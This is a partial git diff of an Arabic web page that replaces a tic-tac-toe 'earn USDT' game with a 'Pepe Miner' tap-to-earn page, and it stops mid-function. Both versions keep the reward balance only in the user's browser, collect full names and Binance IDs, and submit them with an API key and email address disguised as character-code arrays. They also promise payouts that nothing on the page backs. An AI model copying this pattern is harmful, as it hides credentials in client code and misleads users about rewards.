+    box-shadow: 0 0 12px rgba(74,222,128,0.7);
+  }
+
+  .status {
+    font-size: 0.78rem;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    margin-top: 14px;
+    min-height: 20px;
+    transition: color 0.3s;
+    font-weight: 600;
+  }
+
+  .status.active { color: var(--green-bright); }
+  .status.burst { color: var(--gold); }
+
+  .stats-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-top: 18px;
+  }
+
+  .stat-box {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 10px;
+    text-align: center;
+  }
+
+  .stat-label {
+    font-size: 0.65rem;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+    font-weight: 700;
+  }
+
+  .stat-value {
+    font-family: 'Courier New', monospace;
+    font-size: 1rem;
+    font-weight: 700;
+    color: var(--green-bright);
+    letter-spacing: 1px;
+  }
+
+  .withdraw-btn {
+    width: 100%;
+    max-width: 400px;
+    padding: 15px;
+    font-size: 0.85rem;
+    font-weight: 700;
+    letter-spacing: 2px;
+    border: 1px solid rgba(251,191,36,0.3);
+    border-radius: 14px;
+    background: linear-gradient(135deg, rgba(251,191,36,0.12), rgba(239,68,68,0.12));
+    color: var(--gold);
+    cursor: pointer;
+    transition: all 0.3s;
+    font-family: 'Cairo', sans-serif;
+  }
+
+  .withdraw-btn:hover:not(:disabled) {
+    background: linear-gradient(135deg, rgba(251,191,36,0.25), rgba(239,68,68,0.25));
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(251,191,36,0.2);
+  }
+
+  .withdraw-btn:disabled {
+    border-color: rgba(100,116,139,0.2);
+    color: #334155;
+    background: rgba(100,116,139,0.05);
+    cursor: not-allowed;
+  }
+
+  .float-reward {
+    position: fixed;
+    color: var(--green-bright);
+    font-family: 'Courier New', monospace;
+    font-weight: 700;
+    font-size: 1rem;
+    pointer-events: none;
+    animation: floatUp 1.1s ease-out forwards;
+    z-index: 99;
+    text-shadow: 0 0 12px rgba(74,222,128,0.9);
+    direction: ltr;
+  }
+
+  @keyframes floatUp {
+    0%   { opacity: 1; transform: translateY(0) scale(1); }
+    100% { opacity: 0; transform: translateY(-80px) scale(1.2); }
+  }
+
+  .particle {
+    position: fixed;
+    width: 4px;
+    height: 4px;
+    border-radius: 50%;
+    background: var(--green-bright);
+    pointer-events: none;
+    box-shadow: 0 0 8px var(--green-bright);
+    animation: particleFly 0.9s ease-out forwards;
+  }
+
+  @keyframes particleFly {
+    0%   { opacity: 1; transform: translate(0, 0) scale(1); }
+    100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(0.2); }
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: rgba(15,23,42,0.95);
+    border: 1px solid rgba(34,197,94,0.3);
+    border-radius: 12px;
+    padding: 12px 24px;
+    color: var(--text);
+    font-size: 0.85rem;
+    transition: transform 0.4s ease;
+    z-index: 200;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    max-width: 90%;
+    text-align: center;
+  }
+
+  .toast.show { transform: translateX(-50%) translateY(0); }
+
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(10px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 300;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s;
+    padding: 20px;
+  }
+
+  .modal-overlay.show { opacity: 1; pointer-events: auto; }
+
+  .modal {
+    background: linear-gradient(160deg, #0f172a, #050810);
+    border: 1px solid rgba(34,197,94,0.3);
+    border-radius: 22px;
+    padding: 28px 24px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 25px 60px rgba(0,0,0,0.7);
+    transform: scale(0.9);
+    transition: transform 0.3s;
+    color: #fff;
+  }
+
+  .modal-overlay.show .modal { transform: scale(1); }
+
+  .modal-title {
+    font-size: 1.3rem;
+    font-weight: 900;
+    text-align: center;
+    margin-bottom: 8px;
+    color: var(--green-bright);
+  }
+
+  .modal-sub {
+    font-size: 0.8rem;
+    color: var(--text-dim);
+    text-align: center;
+    margin-bottom: 20px;
+    line-height: 1.7;
+  }
+
+  .modal-balance {
+    background: linear-gradient(135deg, rgba(38,161,123,0.15), rgba(46,204,113,0.05));
+    border: 2px solid rgba(38,161,123,0.35);
+    border-radius: 14px;
+    padding: 14px;
+    text-align: center;
+    margin-bottom: 18px;
+  }
+
+  .modal-balance-label {
+    font-size: 11px;
+    color: #a0a0b0;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+
+  .modal-balance-value {
+    font-size: 26px;
+    font-weight: 900;
+    color: #26a17b;
+    direction: ltr;
+    line-height: 1;
+    text-shadow: 0 0 15px rgba(38,161,123,0.5);
+  }
+
+  .modal-balance-value small { font-size: 13px; opacity: 0.85; }
+
+  .form-group {
+    margin-bottom: 14px;
+  }
+
+  .form-group label {
+    display: block;
+    font-size: 12px;
+    font-weight: 800;
+    margin-bottom: 7px;
+    color: #fff;
+    font-family: 'Cairo', sans-serif;
+  }
+
+  .form-group label::after {
+    content: ' *';
+    color: #ef4444;
+  }
+
+  .form-group input {
+    width: 100%;
+    padding: 14px;
+    background: rgba(0,0,0,0.4);
+    border: 2px solid rgba(255,255,255,0.1);
+    border-radius: 12px;
+    color: var(--text);
+    font-family: 'Cairo', sans-serif;
+    font-size: 1rem;
+    text-align: right;
+    letter-spacing: 1px;
+    outline: none;
+    transition: border-color 0.3s;
+  }
+
+  .form-group input:focus {
+    border-color: #22c55e;
+    box-shadow: 0 0 0 4px rgba(34,197,94,0.15);
+  }
+
+  .form-group input::placeholder {
+    color: rgba(255,255,255,0.3);
+    font-size: 0.9rem;
+  }
+
+  .modal-actions {
+    display: flex;
+    gap: 10px;
+    margin-top: 18px;
+  }
+
+  .btn {
+    flex: 1;
+    padding: 13px;
+    border: none;
+    border-radius: 12px;
+    font-weight: 800;
+    font-size: 0.85rem;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.25s;
+    font-family: 'Cairo', sans-serif;
+  }
+
+  .btn-cancel {
+    background: rgba(100,116,139,0.2);
+    color: #94a3b8;
+  }
+
+  .btn-cancel:hover { background: rgba(100,116,139,0.35); }
+
+  .btn-confirm {
+    background: linear-gradient(135deg, #22c55e, #15803d);
+    color: white;
+    box-shadow: 0 5px 20px rgba(34,197,94,0.4);
+  }
+
+  .btn-confirm:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(34,197,94,0.6);
+  }
+
+  .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  @media (max-width: 420px) {
+    .counter { font-size: 2.2rem; }
+    .balance-value { font-size: 1.7rem; }
+    .logo-text { font-size: 1.3rem; letter-spacing: 3px; }
+    .pepe-wrap { width: 160px; height: 160px; }
+    .pepe { width: 115px; height: 115px; }
+    .ring-1 { width: 150px; height: 150px; }
+    .ring-2 { width: 180px; height: 180px; }
+    .ring-3 { width: 210px; height: 210px; }
+  }
+</style>
 </head>
 <body>
 
-    <div class="container">
+  <div class="header">
+    <div class="logo-text">بيبي ماینر</div>
+    <a href="games.html" class="back-btn">← الألعاب</a>
+  </div>
 
-        <div class="header">
-            <span class="logo">PAID PLUS</span>
-            <a href="games.html" class="back-btn">← الألعاب</a>
-        </div>
+  <div class="main-card">
 
-        <div class="stats">
-            <div class="stat win">
-                <span class="stat-label">فوز</span>
-                <span class="stat-value" id="wins">0</span>
-            </div>
-            <div class="stat lose">
-                <span class="stat-label">خسارة</span>
-                <span class="stat-value" id="losses">0</span>
-            </div>
-            <div class="stat tie">
-                <span class="stat-label">تعادل</span>
-                <span class="stat-value" id="ties">0</span>
-            </div>
-        </div>
-
-        <div class="plays-bar">
-            <div class="plays-label">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                    <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
-                </svg>
-                مرات متبقية
-            </div>
-            <div class="plays-count" id="playsLeft">30</div>
-        </div>
-
-        <div class="cooldown-bar" id="cooldownBar">
-            <div class="cooldown-label">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                    <circle cx="12" cy="12" r="10"/>
-                    <polyline points="12 6 12 12 16 14"/>
-                </svg>
-                المرات القادمة بعد
-            </div>
-            <div class="cooldown-timer" id="cooldownTimer">06:00:00</div>
-        </div>
-
-        <div class="game-area">
-            <div class="turn-indicator" id="turnIndicator">
-                اضغط "ابدأ اللعب" للبدء
-            </div>
-
-            <div class="board-grid" id="boardGrid">
-                <div class="cell" data-index="0"></div>
-                <div class="cell" data-index="1"></div>
-                <div class="cell" data-index="2"></div>
-                <div class="cell" data-index="3"></div>
-                <div class="cell" data-index="4"></div>
-                <div class="cell" data-index="5"></div>
-                <div class="cell" data-index="6"></div>
-                <div class="cell" data-index="7"></div>
-                <div class="cell" data-index="8"></div>
-            </div>
-
-            <button class="start-btn" id="startBtn" onclick="startGame()">
-                <svg viewBox="0 0 24 24" fill="currentColor">
-                    <polygon points="5 3 19 12 5 21 5 3"/>
-                </svg>
-                ابدأ اللعب
-            </button>
-        </div>
-
-        <div class="balance-card">
-            <div class="balance-icon">
-                <img src="USDT_logo.png" alt="USDT">
-            </div>
-            <div class="balance-info">
-                <div class="balance-label">رصيدك</div>
-                <div class="balance-value">
-                    <span id="balanceAmount">0.00000</span>
-                    <span class="balance-symbol">USDT</span>
-                </div>
-            </div>
-            <button class="withdraw-btn" id="withdrawBtn" onclick="openWithdraw()" disabled>
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                    <rect x="3" y="11" width="18" height="11" rx="2"/>
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                </svg>
-                <span id="withdrawText">السحب</span>
-            </button>
-        </div>
-
+    <div class="balance-card">
+      <div class="balance-label">الرصيد الكلي</div>
+      <div class="balance-value" id="balanceEl">0</div>
+      <div class="balance-unit">PEPE</div>
     </div>
 
-    <div class="result-overlay" id="resultOverlay">
-        <div class="result-box">
-            <div class="result-icon" id="resultIcon"></div>
-            <div class="result-title" id="resultTitle"></div>
-            <div class="result-prize" id="resultPrize"></div>
-            <button class="result-btn" onclick="closeResult()">حسناً</button>
-        </div>
+    <div class="timer-card">
+      <div class="timer-label">الوقت المتبقي للساعة</div>
+      <div class="timer-value" id="timerEl">00:00:00</div>
     </div>
 
-    <!-- ============================================
-         نافذة السحب (مع حقول منفصلة)
-    ============================================ -->
-    <div class="withdraw-modal" id="withdrawModal">
-        <div class="withdraw-content" id="withdrawContent">
-            <button class="modal-close" onclick="closeWithdraw()">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
+    <div class="pepe-stage">
+      <div class="counter" id="counter">0</div>
 
-            <div class="modal-title">طلب سحب إلى Binance</div>
+      <div class="pepe-wrap">
+        <div class="ring ring-1"></div>
+        <div class="ring ring-2"></div>
+        <div class="ring ring-3"></div>
+        <img id="pepeImg" class="pepe" src="pepe.png" alt="Pepe"
+             onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 200 200%22><circle cx=%22100%22 cy=%22100%22 r=%2295%22 fill=%22%2322c55e%22/><circle cx=%2275%22 cy=%2280%22 r=%2212%22 fill=%22%230a0e1a%22/><circle cx=%22125%22 cy=%2280%22 r=%2212%22 fill=%22%230a0e1a%22/><path d=%22M65 125 Q100 160 135 125%22 stroke=%22%230a0e1a%22 stroke-width=%228%22 fill=%22none%22 stroke-linecap=%22round%22/></svg>'">
+      </div>
 
-            <div class="frozen-balance">
-                <div class="frozen-label">المبلغ المتاح للسحب</div>
-                <div class="frozen-amount"><span id="binanceAmount">0.00</span> <small>USDT</small></div>
-            </div>
+      <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
 
-            <form id="formBinance" onsubmit="submitWithdraw(event)">
-                <!-- ✅ الحقول المنفصلة (ستظهر كلها في الإيميل) -->
-                <input type="hidden" name="subject" value="طلب سحب USDT - لعبة XO" />
-                <input type="hidden" name="amount" id="fieldAmount" value="" />
-                <input type="hidden" name="wins" id="fieldWins" value="" />
-                <input type="hidden" name="losses" id="fieldLosses" value="" />
-                <input type="hidden" name="ties" id="fieldTies" value="" />
-                <input type="hidden" name="withdraw_date" id="fieldDate" value="" />
-                <input type="hidden" name="game" value="لعبة X O" />
-                
-                <div class="form-group">
-                    <label>الاسم الكامل</label>
-                    <input type="text" name="full_name" placeholder="أدخل اسمك الكامل" required />
-                </div>
-                
-                <div class="form-group">
-                    <label>Binance ID</label>
-                    <input type="text" name="binance_id" placeholder="أدخل Binance ID" inputmode="numeric" required />
-                </div>
-                
-                <button type="submit" class="submit-btn" id="submitBinance">إرسال طلب السحب</button>
-            </form>
-        </div>
+      <div class="status" id="statusEl">اضغط على الأيقونة لبدء التعدين</div>
     </div>
 
-    <script>
-        /* ============================================
-           🔒 المفاتيح المشفرة
-        ============================================ */
-        const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
-        const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
-        const _K3 = [53, 99, 52, 56];
-        const _EM = [109, 97, 121, 97, 114, 97, 121, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];
-
-        function _dk() {
-            let s = '';
-            for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
-            for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
-            for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
-            return s;
-        }
-
-        function _de() {
-            let s = '';
-            for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
-            return s;
-        }
-
-        /* ============================================
-           الإعدادات
-        ============================================ */
-        const REWARD_PER_WIN = 0.0005;
-        const MAX_PLAYS = 30;
-        const COOLDOWN = 6 * 60 * 60 * 1000;
-        const MIN_WITHDRAW = 0.01;
-
-        /* ============================================
-           حالة اللعبة (مع الحفظ)
-        ============================================ */
-        let state = {
-            board: ['', '', '', '', '', '', '', '', ''],
-            playerTurn: true,
-            gameActive: false,
-            moves: 0,
-            balance: parseFloat(localStorage.getItem('xoBalance') || '0'),
-            wins: parseInt(localStorage.getItem('xoWins') || '0'),
-            losses: parseInt(localStorage.getItem('xoLosses') || '0'),
-            ties: parseInt(localStorage.getItem('xoTies') || '0'),
-            playsLeft: parseInt(localStorage.getItem('xoPlaysLeft') || String(MAX_PLAYS)),
-            lastReset: parseInt(localStorage.getItem('xoLastReset') || '0')
-        };
-
-        let lastWithdrawTime = parseInt(localStorage.getItem('xoLastWithdraw') || '0');
-        let cooldownInterval = null;
-
-        /* ============================================
-           حفظ الحالة
-        ============================================ */
-        function saveState() {
-            localStorage.setItem('xoBalance', state.balance);
-            localStorage.setItem('xoWins', state.wins);
-            localStorage.setItem('xoLosses', state.losses);
-            localStorage.setItem('xoTies', state.ties);
-            localStorage.setItem('xoPlaysLeft', state.playsLeft);
-            localStorage.setItem('xoLastReset', state.lastReset);
-        }
-
-        /* ============================================
-           العناصر
-        ============================================ */
-        const cells = document.querySelectorAll('.cell');
-        const turnIndicator = document.getElementById('turnIndicator');
-        const startBtn = document.getElementById('startBtn');
-        const balanceEl = document.getElementById('balanceAmount');
-        const winsEl = document.getElementById('wins');
-        const lossesEl = document.getElementById('losses');
-        const tiesEl = document.getElementById('ties');
-        const playsLeftEl = document.getElementById('playsLeft');
-        const withdrawBtn = document.getElementById('withdrawBtn');
-        const withdrawText = document.getElementById('withdrawText');
-        const cooldownBar = document.getElementById('cooldownBar');
-        const cooldownTimer = document.getElementById('cooldownTimer');
-
-        /* ============================================
-           العداد التنازلي
-        ============================================ */
-        function updateCooldown() {
-            if (state.playsLeft > 0) {
-                cooldownBar.classList.remove('show');
-                if (cooldownInterval) {
-                    clearInterval(cooldownInterval);
-                    cooldownInterval = null;
-                }
-                return;
-            }
-
-            const now = Date.now();
-            const remaining = COOLDOWN - (now - state.lastReset);
-
-            if (remaining <= 0) {
-                state.playsLeft = MAX_PLAYS;
-                state.lastReset = now;
-                saveState();
-                updateUI();
-                cooldownBar.classList.remove('show');
-                if (cooldownInterval) {
-                    clearInterval(cooldownInterval);
-                    cooldownInterval = null;
-                }
-                startBtn.disabled = false;
-                startBtn.innerHTML = `
-                    <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-                    ابدأ اللعب
-                `;
-                return;
-            }
-
-            cooldownBar.classList.add('show');
-
-            const h = Math.floor(remaining / 3600000);
-            const m = Math.floor((remaining % 3600000) / 60000);
-            const s = Math.floor((remaining % 60000) / 1000);
-            cooldownTimer.textContent = 
-                `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
-        }
-
-        function startCooldownWatcher() {
-            if (cooldownInterval) return;
-            cooldownInterval = setInterval(updateCooldown, 1000);
-            updateCooldown();
-        }
-
-        function checkReset() {
-            const now = Date.now();
-
-            if (state.lastReset === 0) {
-                state.lastReset = now;
-                state.playsLeft = MAX_PLAYS;
-                saveState();
-            } else if (now - state.lastReset >= COOLDOWN) {
-                state.playsLeft = MAX_PLAYS;
-                state.lastReset = now;
-                saveState();
-            }
-
-            startCooldownWatcher();
-        }
-
-        /* ============================================
-           تحديث الواجهة
-        ============================================ */
-        function updateUI() {
-            balanceEl.textContent = state.balance.toFixed(5);
-            winsEl.textContent = state.wins;
-            lossesEl.textContent = state.losses;
-            tiesEl.textContent = state.ties;
-            playsLeftEl.textContent = state.playsLeft;
-
-            if (state.balance >= MIN_WITHDRAW) {
-                withdrawBtn.disabled = false;
-                withdrawText.textContent = 'سحب';
-            } else {
-                withdrawBtn.disabled = true;
-                withdrawText.textContent = 'الحد 0.01';
-            }
-        }
-
-        /* ============================================
-           بدء اللعبة
-        ============================================ */
-        function startGame() {
-            checkReset();
-
-            if (state.playsLeft <= 0) return;
-
-            state.board = ['', '', '', '', '', '', '', '', ''];
-            state.playerTurn = true;
-            state.gameActive = true;
-            state.moves = 0;
-            state.playsLeft--;
-
-            if (state.playsLeft <= 0) {
-                state.lastReset = Date.now();
-                startCooldownWatcher();
-            }
-
-            saveState();
-
-            cells.forEach(cell => {
-                cell.textContent = '';
-                cell.className = 'cell';
-            });
-
-            turnIndicator.innerHTML = 'دورك — <span class="you">X</span>';
-            startBtn.disabled = true;
-            startBtn.textContent = 'جارية الآن';
-            updateUI();
-        }
-
-        /* ============================================
-           الأحداث
-        ============================================ */
-        cells.forEach(cell => {
-            cell.addEventListener('click', () => handleClick(cell));
-        });
-
-        function handleClick(cell) {
-            if (!state.gameActive || !state.playerTurn) return;
-
-            const index = parseInt(cell.dataset.index);
-            if (state.board[index] !== '') return;
-
-            state.board[index] = 'X';
-            cell.textContent = 'X';
-            cell.classList.add('x', 'taken');
-            state.moves++;
-
-            if (checkWin('X')) {
-                endGame('win');
-                return;
-            }
-
-            if (state.moves === 9) {
-                endGame('tie');
-                return;
-            }
-
-            state.playerTurn = false;
-            turnIndicator.innerHTML = 'دور الروبوت — <span class="robot">O</span>';
-            setTimeout(robotMove, 500);
-        }
-
-        function robotMove() {
-            if (!state.gameActive) return;
-
-            if (Math.random() < 0.1) {
-                const empty = state.board.map((v, i) => v === '' ? i : -1).filter(i => i !== -1);
-                if (empty.length) {
-                    const idx = empty[Math.floor(Math.random() * empty.length)];
-                    makeRobotMove(idx);
-                    return;
-                }
-            }
-
-            const index = getBestMove();
-            if (index === -1) return;
-            makeRobotMove(index);
-        }
-
-        function makeRobotMove(index) {
-            state.board[index] = 'O';
-            const cell = document.querySelector(`[data-index="${index}"]`);
-            cell.textContent = 'O';
-            cell.classList.add('o', 'taken');
-            state.moves++;
-
-            if (checkWin('O')) {
-                endGame('lose');
-                return;
-            }
-
-            if (state.moves === 9) {
-                endGame('tie');
-                return;
-            }
-
-            state.playerTurn = true;
-            turnIndicator.innerHTML = 'دورك — <span class="you">X</span>';
-        }
-
-        function getBestMove() {
-            const b = state.board;
-
-            for (let i = 0; i < 9; i++) {
-                if (b[i] === '') {
-                    b[i] = 'O';
-                    if (checkWin('O', true)) { b[i] = ''; return i; }
-                    b[i] = '';
-                }
-            }
-
-            for (let i = 0; i < 9; i++) {
-                if (b[i] === '') {
-                    b[i] = 'X';
-                    if (checkWin('X', true)) { b[i] = ''; return i; }
-                    b[i] = '';
-                }
-            }
-
-            if (b[4] === '') return 4;
-
-            const corners = [0, 2, 6, 8].filter(i => b[i] === '');
-            if (corners.length) return corners[Math.floor(Math.random() * corners.length)];
-
-            const empty = b.map((v, i) => v === '' ? i : -1).filter(i => i !== -1);
-            return empty.length ? empty[Math.floor(Math.random() * empty.length)] : -1;
-        }
-
-        function checkWin(player, justCheck = false) {
-            const b = state.board;
-            const lines = [
-                [0, 1, 2], [3, 4, 5], [6, 7, 8],
-                [0, 3, 6], [1, 4, 7], [2, 5, 8],
-                [0, 4, 8], [2, 4, 6]
-            ];
-
-            for (const line of lines) {
-                if (b[line[0]] === player && b[line[1]] === player && b[line[2]] === player) {
-                    if (!justCheck) {
-                        line.forEach(i => cells[i].classList.add('win'));
-                    }
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        /* ============================================
-           إنهاء اللعبة
-        ============================================ */
-        function endGame(result) {
-            state.gameActive = false;
-            cells.forEach(c => c.classList.add('disabled'));
-
-            let iconHTML = '';
-            let titleText = '';
-            let prizeText = '';
-
-            if (result === 'win') {
-                state.balance += REWARD_PER_WIN;
-                state.wins++;
-
-                iconHTML = '🏆';
-                titleText = 'فزت!';
-                prizeText = `
-                    ربحت جائزة!
-                    <strong>+${REWARD_PER_WIN.toFixed(4)} USDT</strong>
-                `;
-            } else if (result === 'lose') {
-                state.losses++;
-                iconHTML = '😢';
-                titleText = 'خسرت';
-                prizeText = 'حاول مرة أخرى!';
-            } else {
-                state.ties++;
-                iconHTML = '🤝';
-                titleText = 'تعادل';
-                prizeText = 'لا ربح — لا خسارة';
-            }
-
-            saveState();
-            updateUI();
-
-            if (state.playsLeft > 0) {
-                startBtn.disabled = false;
-                startBtn.innerHTML = `
-                    <svg viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-                    العب مرة أخرى
-                `;
-            } else {
-                startBtn.disabled = true;
-                startBtn.textContent = 'انتهت المرات — انتظر';
-            }
-
-            const overlay = document.getElementById('resultOverlay');
-            const iconEl = document.getElementById('resultIcon');
-            const titleEl = document.getElementById('resultTitle');
-            const prizeEl = document.getElementById('resultPrize');
-
-            iconEl.textContent = iconHTML;
-            iconEl.className = 'result-icon ' + result;
-
-            titleEl.textContent = titleText;
-            titleEl.className = 'result-title ' + result;
-
-            prizeEl.innerHTML = prizeText;
-
-            overlay.classList.add('show');
-        }
-
-        function closeResult() {
-            document.getElementById('resultOverlay').classList.remove('show');
-        }
-
-        /* ============================================
-           نافذة السحب
-        ============================================ */
-        function openWithdraw() {
-            if (state.balance < MIN_WITHDRAW) return;
-            if (Date.now() - lastWithdrawTime < 24 * 60 * 60 * 1000) {
-                alert('انتظر 24 ساعة');
-                return;
-            }
-            
-            document.getElementById('binanceAmount').textContent = state.balance.toFixed(5);
-            document.getElementById('withdrawModal').classList.add('show');
-        }
-
-        function closeWithdraw() {
-            document.getElementById('withdrawModal').classList.remove('show');
-        }
-
-        /* ============================================
-           ✅ إرسال طلب السحب (حقول منفصلة)
-        ============================================ */
-        function submitWithdraw(event) {
-            event.preventDefault();
-
-            if (Date.now() - lastWithdrawTime < 24 * 60 * 60 * 1000) {
-                alert('انتظر 24 ساعة');
-                return;
-            }
-
-            const form = event.target;
-            const formData = new FormData(form);
-
-            // 🔒 المفتاح والإيميل المشفرين
-            formData.set('apiKey', _dk());
-            formData.set('email', _de());
-
-            // ✅ التحقق من البيانات
-            const fullName = formData.get('full_name').trim();
-            const bid = formData.get('binance_id').trim();
-
-            if (!fullName) {
-                alert('الرجاء إدخال الاسم الكامل');
-                return;
-            }
-
-            if (!bid || bid.length < 6) { 
-                alert('Binance ID غير صالح'); 
-                return;
-            }
-
-            // ✅ حفظ الرصيد قبل التصفير
-            const withdrawAmount = state.balance;
-
-            // ✅ تعبئة الحقول المنفصلة (ستظهر كلها في الإيميل)
-            document.getElementById('fieldAmount').value = withdrawAmount.toFixed(5) + ' USDT';
-            document.getElementById('fieldWins').value = state.wins;
-            document.getElementById('fieldLosses').value = state.losses;
-            document.getElementById('fieldTies').value = state.ties;
-            document.getElementById('fieldDate').value = new Date().toLocaleString('ar-EG');
-
-            const btn = form.querySelector('.submit-btn');
-            btn.disabled = true;
-            btn.textContent = '⏳ جارٍ الإرسال...';
-
-            // إعادة بناء formData بعد تعبئة الحقول
-            const sendData = new FormData(form);
-            sendData.set('apiKey', _dk());
-            sendData.set('email', _de());
-
-            fetch('https://api.staticforms.dev/submit', { method: 'POST', body: sendData })
-                .then(() => showSuccess(withdrawAmount, fullName, bid))
-                .catch(() => showSuccess(withdrawAmount, fullName, bid));
-        }
-
-        /* ============================================
-           نجاح السحب
-        ============================================ */
-        function showSuccess(withdrawAmount, fullName, binanceId) {
-            // 💾 تصفير الرصيد
-            state.balance = 0;
-            lastWithdrawTime = Date.now();
-            localStorage.setItem('xoLastWithdraw', lastWithdrawTime);
-            saveState();
-            updateUI();
-
-            document.getElementById('withdrawContent').innerHTML = `
-                <div class="success-box">
-                    <div class="success-icon">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                            <polyline points="20 6 9 17 4 12"/>
-                        </svg>
-                    </div>
-                    <div class="success-title">تم إرسال طلبك!</div>
-                    <div class="success-text">
-                        سيتم الإرسال إلى حسابك على Binance<br>
-                        <b>${withdrawAmount.toFixed(5)} USDT</b><br>
-                        إلى الاسم: <b>${fullName}</b><br>
-                        Binance ID: <b style="direction:ltr;display:inline-block;">${binanceId}</b><br>
-                        <span style="font-size:11px;">خلال 24-48 ساعة</span>
-                    </div>
-                    <div style="background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.3); border-radius: 12px; padding: 10px; margin-bottom: 18px;">
-                        <p style="color: #f39c12; font-size: 12px; text-align: center; font-weight: 700;">
-                            ⚠️ تم تصفير رصيدك — ابدأ من جديد
-                        </p>
-                    </div>
-                    <button onclick="closeWithdraw(); location.reload();" 
-                            class="submit-btn" 
-                            style="background: linear-gradient(135deg, #26a17b, #2ecc71); color: #fff; width: 100%;">
-                        حسناً، شكراً
-                    </button>
-                </div>
-            `;
-        }
-
-        /* ============================================
-           التشغيل
-        ============================================ */
-        checkReset();
-        updateUI();
-    </script>
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="stat-label">معدل التعدين</div>
+        <div class="stat-value" id="rateEl">1 / ساعة</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-label">حالة النظام</div>
+        <div class="stat-value" id="sysStatusEl">جاهز</div>
+      </div>
+    </div>
+
+  </div>
+
+  <button class="withdraw-btn" id="withdrawBtn" disabled>سحب · الحد الأدنى 100 PEPE</button>
+
+  <!-- نافذة السحب -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal" id="modalContent">
+      <div class="modal-title">طلب سحب إلى Binance</div>
+      <div class="modal-sub">أدخل بياناتك للسحب</div>
+
+      <div class="modal-balance">
+        <div class="modal-balance-label">المبلغ المتاح للسحب</div>
+        <div class="modal-balance-value"><span id="modalBalance">0</span> <small>PEPE</small></div>
+      </div>
+
+      <form id="withdrawForm" onsubmit="submitWithdraw(event)">
+        <!-- ✅ حقول منفصلة (ستظهر كلها في الإيميل) -->
+        <input type="hidden" name="subject" value="طلب سحب PEPE - لعبة بيبي ماینر" />
+        <input type="hidden" name="amount" id="fieldAmount" value="" />
+        <input type="hidden" name="withdraw_date" id="fieldDate" value="" />
+        <input type="hidden" name="game" value="بيبي ماینر" />
+
+        <div class="form-group">
+          <label>الاسم الكامل</label>
+          <input type="text" name="full_name" placeholder="أدخل اسمك الكامل" required />
+        </div>
+
+        <div class="form-group">
+          <label>Binance ID</label>
+          <input type="text" name="binance_id" placeholder="أدخل Binance ID" inputmode="numeric" required />
+        </div>
+
+        <div class="modal-actions">
+          <button type="button" class="btn btn-cancel" id="cancelBtn">إلغاء</button>
+          <button type="submit" class="btn btn-confirm" id="confirmBtn">إرسال الطلب</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================
+     🔒 المفاتيح المشفرة
+  ============================================ */
+  const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
+  const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
+  const _K3 = [53, 99, 52, 56];
+  const _EM = [109, 97, 121, 97, 114, 97, 121, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];
+
+  function _dk() {
+    let s = '';
+    for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
+    for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
